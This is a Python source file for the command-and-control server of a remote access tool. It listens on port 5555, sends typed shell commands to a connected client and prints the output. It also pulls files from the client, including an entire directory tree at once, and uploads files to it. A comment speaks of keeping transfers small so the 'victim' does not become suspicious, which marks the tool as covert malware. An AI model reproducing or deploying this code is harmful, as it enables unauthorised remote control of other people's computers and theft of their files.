import socket
import sys
import struct
import os
import time


class Server():

    def __init__(self):
        self.sock = None
        self.host = ''
        self.port = 5555

    # Create socket (allows two computers to connect)
    def socket_create(self):
        try:
            self.sock = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return


    # Bind socket to port (the host and port the communication will take place) and wait for connection from client
    def socket_bind(self):
        try:
            print("Binding socket to port: " + str(self.port))
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
        except socket.error as msg:
            print("Socket binding error: " + str(msg))


    # Establish connection with client (socket must be listening for them)
    def socket_accept(self):
        conn, address = self.sock.accept()
        print("Connection has been established | %s:%s" %(address[0],str(address[1])))
        self.send_commands(conn)
        conn.close()


    def download(self, conn, command):
        # encode to bytes to send to client
        conn.send(str.encode(command))
        file = open('%s' %(command.split('@')[-1]), 'wb')
        while True:
            # file recv as a bytes
            bits = conn.recv(204800)
            if str.encode('download@False') in bits:
                print('Unable to find out the file')
                break
            if bits.endswith(str.encode('Transfer %s Complete' % command.split('@')[-1])):
                file.write(bits[:len(bits)-len('Transfer %s Complete' % command.split('@')[-1])])
                print('Transfer %s Complete' % command.split('@')[-1])
                break
            file.write(bits)
        file.close()


    def download_all(self, conn, command):
        dir_list = []
        file_list = []
        raw_dir_list = []
        raw_file_list = []
        count = 0
        name = '_MASS_TRANSFER'
        tday = time.strftime('%Y_%m_%d_')
        fpath = tday + name
        try:
            os.makedirs(fpath)
        except FileExistsError:
            pass
        os.chdir(fpath)

        # encode to bytes to send to client
        conn.send(str.encode(command))

        while True:
            bits = conn.recv(13)
            if bits == (str.encode('download@fldr')):
                path = str(self.responses(conn), 'utf-8')
                raw_dir_list.append(path)
            if bits == (str.encode('download@file')):
                file = str(self.responses(conn), 'utf-8')
                raw_file_list.append(file)
            if bits == (str.encode('download@done')):
                break

        home = raw_dir_list[0].split("\\")[-1]
        for directory in raw_dir_list :
            path = home + directory.split(home)[-1]
            dir_list.append(path)
        for file in raw_file_list :
            path = home + file.split(home)[-1]
            file_list.append(path)
        del raw_dir_list, raw_file_list

        for path in dir_list:
            try:
                os.makedirs(path)
            except FileExistsError:
                pass

        for file in file_list:
            print(file + '....  ', end='')
            data = open(file, 'wb')
            while True:
                # file recv as a bytes
                bits = conn.recv(204800)
                if bits.endswith(str.encode('Transfer %s Complete' % file.split('\\')[-1])):
                    data.write(bits[:len(bits)-len('Transfer %s Complete' % file.split('\\')[-1])])
                    print('Complete')
                    break
                data.write(bits)
            data.close()
        os.chdir('..')


    def upload(self, conn, cmd):
        data = cmd.split('@')[1]
        if os.path.exists(data):
            conn.send(str.encode(cmd))
            file = open(data, 'rb')
            # package read as a byte
            # 200 KB transfer buffer, dont make the victim feels suspicious
            packet = file.read(204800)
            # package send as a byte
            while packet != str.encode(''):
                conn.send(packet)
                # 2 MB transfer buffer
                packet = file.read(204800)
            # parameter send as a byte
            conn.send(str.encode('Transfer %s Complete' % data))
            print('Transfer %s Complete' % data)
            file.close()
        else:
            print('File is not Exist')


    def responses(self, conn):
        """ Read message length and unpack it into an integer
        :param conn:
        """
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    # Send commands
    def send_commands(self, conn):
        conn.send(str.encode(" "))
        cwd_bytes = self.responses(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if cmd == 'quit':
                    conn.close()
                    self.sock.close()
                    sys.exit()
                if cmd == 'download@*.*':
                    self.download_all(conn, cmd)
                    cmd_output = self.responses(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                    continue
                if 'download@' in cmd:
                    self.download(conn, cmd)
                    cmd_output = self.responses(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                    continue
                if 'upload@' in cmd:
                    self.upload(conn, cmd)
                    time.sleep(1)
                    conn.send(str.encode(' '))
                    cmd_output = self.responses(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                    continue
                if len(str.encode(cmd)) > 0 and not 'download@' in cmd and not 'upload@' in cmd :
                    # encode to bytes to send to server
                    conn.send(str.encode(cmd))
                    # the result decode so human readable
                    cmd_output = self.responses(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if len(str.encode(cmd)) == 0:
                    # encode to bytes to send to server
                    conn.send(str.encode(' '))
                    # the result  decode so human readable
                    cmd_output = self.responses(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
            except Exception as e:
                print("Connection was lost %s" %str(e))
                break



    def main(self):
        self.socket_create()
        self.socket_bind()
        self.socket_accept()


Server().main()
